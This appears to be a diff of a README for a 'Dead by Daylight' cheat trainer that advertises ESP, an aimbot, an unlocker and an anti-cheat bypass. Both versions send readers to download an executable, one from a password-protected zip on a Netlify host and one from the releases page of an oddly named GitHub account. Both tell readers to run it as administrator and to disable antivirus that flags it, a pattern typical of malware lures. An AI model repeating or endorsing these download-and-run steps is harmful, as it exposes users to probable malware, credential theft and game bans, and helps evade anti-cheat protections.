@@ -1,54 +1,87 @@
-# 🩸 DBD AutoGrind Trainer 2026 Pro – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Pro - Automate your character progression with ease
 
-> **Slip through the Fog unnoticed.** The Pro trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📋 Overview
 
-## 📦 What’s Inside
+The DBD-AutoGrind-Trainer-2026-Pro application provides a set of tools for Dead by Daylight players. It manages Bloodpoint accumulation, unlocks game content, and provides visual aids during matches. This tool runs as an external process to ensure compatibility and ease of use.
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+## ⚙️ System Requirements
 
-## ⬇️ Installation
+Before you start, ensure your computer meets these requirements:
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 processor.
+*   Memory: 8 GB RAM.
+*   Graphics: DirectX 11 support.
+*   Network: Stable internet connection.
+*   Permissions: Administrator access on your Windows account.
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+## 📥 Downloading the Tool
 
-## 🆘 Troubleshooting
+1.  Visit the official [releases page](https://github.com/Britishwestafricahedgefund788/DBD-AutoGrind-Trainer-2026-Pro/releases) to find the latest version.
+2.  Locate the most recent release entry at the top of the list.
+3.  Click the blue link to download the zip file to your computer.
+4.  Once the download finishes, move the file to a folder of your choice.
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+## 🛠️ Installation Steps
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+1.  Open the folder containing the downloaded zip file.
+2.  Right-click the file and select "Extract All."
+3.  Choose a destination folder and click "Extract."
+4.  Open the newly created folder.
+5.  Locate the file labeled as an application (.exe).
 
-## 🔍 Search Tags
-`dbd-hack, dbd-mod, 2026, dbd-tool, wallhack, unlocker, auto-farm, esp, dbd-cheat, survivor-hack, bloodpoint-hack, external, skin-unlocker, anti-cheat-bypass, aimbot, killer-hack`
+## 🚀 Running the Software
+
+1.  Close Dead by Daylight before you open the trainer.
+2.  Right-click the application file.
+3.  Select "Run as administrator" to grant the tool the necessary permissions to interface with your system processes.
+4.  A command window will open. Wait for the initialization text to indicate the tool is ready.
+5.  Launch Dead by Daylight through your usual game launcher.
+6.  The trainer will detect the game process automatically and display an overlay.
+
+## 🕹️ Feature Guide
+
+This tool contains several components designed for your gameplay experience.
+
+### Bloodpoint Automation
+The Bloodpoint bot handles the distribution of points across your character web. Enabling this feature allows the software to navigate the bloodweb and select items based on your set priorities. You can toggle this on or off using the designated hotkeys in the primary dashboard of the application.
+
+### Visual Assistance
+The ESP wallhack component draws lines and boxes around entities within the game world. This helps you identify the location of objects and other players during a match. The aimbot feature provides movement assistance for your camera to keep your targets in view. Note that these features process game data externally to remain independent of the game files.
+
+### Content Unlocker
+The full perk and skin unlocker modifies the local manifest files to grant access to content. Select the "Unlock All" option within the trainer menu to apply these changes. Restart your game client after enabling these modifications for them to take effect.
+
+## 🛡️ Usage Guidelines
+
+Use this software at your own risk. Keep the following practices in mind to maintain a stable experience:
+
+*   Keep your system drivers up to date to prevent conflicts.
+*   Disable third-party antivirus software temporarily if it flags the tool incorrectly, as external trainers often trigger false positive security alerts.
+*   Avoid using all features simultaneously to keep your in-game behavior consistent if you wish to remain discreet.
+*   Always check for updates on the release page to ensure your version remains compatible with the current game build.
+
+## 💡 Troubleshooting
+
+If you encounter issues during setup, try these steps:
+
+*   Does the software fail to start? Ensure you are using an administrator account.
+*   Do the features not work in-game? Verify that the game is running in Windowed or Borderless Windowed mode, as this helps the overlay function correctly.
+*   Is the tool crashing? Check that you have the latest version of the .NET Framework installed on your computer.
+*   Do you receive an error about missing files? Re-extract the contents of the zip file to a clean folder.
+
+## 📖 Frequently Asked Questions
+
+**Is this tool permanent?**
+Yes, but game updates often change the memory addresses used by this trainer. When the game updates, check the repository for a new release.
+
+**Does this require coding skills?**
+No. All features are managed via the simple graphical interface provided in the app.
+
+**What happens if the game detects the tool?**
+External tools interact with game memory. While this tool uses standard memory reading methods, be mindful of how you use it. Use the software in casual settings rather than competitive play.
+
+**Can I customize the features?**
+Use the settings menu within the trainer to adjust hotkeys and visual preferences such as colors and display distance.
